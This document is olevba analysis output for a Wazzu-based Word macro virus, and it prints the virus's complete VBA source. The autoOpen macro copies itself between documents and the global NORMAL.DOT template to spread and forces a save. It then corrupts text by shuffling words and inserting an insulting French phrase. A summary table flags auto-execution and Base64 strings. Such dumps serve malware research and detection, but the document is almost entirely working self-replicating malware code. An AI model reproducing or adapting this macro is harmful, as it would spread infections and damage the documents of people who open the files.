olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-edfe4e610c2e26b55d432d511b9000ac85ec4136
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-edfe4e610c2e26b55d432d511b9000ac85ec4136 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu-based-edfe4e610c2e26b55d432d511b9000ac85ec4136 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fichierMacro$
Dim globalMacro$
Dim MacroFichier$
    On Error GoTo -1: On Error GoTo erreuR
        
    WordBasic.FileSummaryInfo Update:=1
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo dlg
    


    fichierMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
    globalMacro$ = "Global:autoOpen"
    MacroFichier$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If MacroFichier$ = "NORMAL.DOT" Then
        WordBasic.MacroCopy globalMacro$, fichierMacro$
        WordBasic.FileSaveAs Format:=1
    Else
        WordBasic.MacroCopy fichierMacro$, globalMacro$
    End If

    LaVoici

GoTo fin
erreuR:

fin:
    On Error GoTo -1: On Error GoTo 0

End Sub

Private Sub LaVoici()
Dim i
Dim selWord$
    For i = 1 To 3
        If Rnd() < 0.2 Then
            WordBasic.SelectCurWord
            selWord$ = WordBasic.[Selection$]()
            WordBasic.DeleteWord
            WordBasic.Insert selWord$ + " "
        End If
    Next
    If Rnd() > 0.25 Then
   WordBasic.EditReplace Find:="donc", Replace:="Mon prof est con, ", Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceOne:=1, Format:=0, Wrap:=2
    WordBasic.StartOfDocument
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

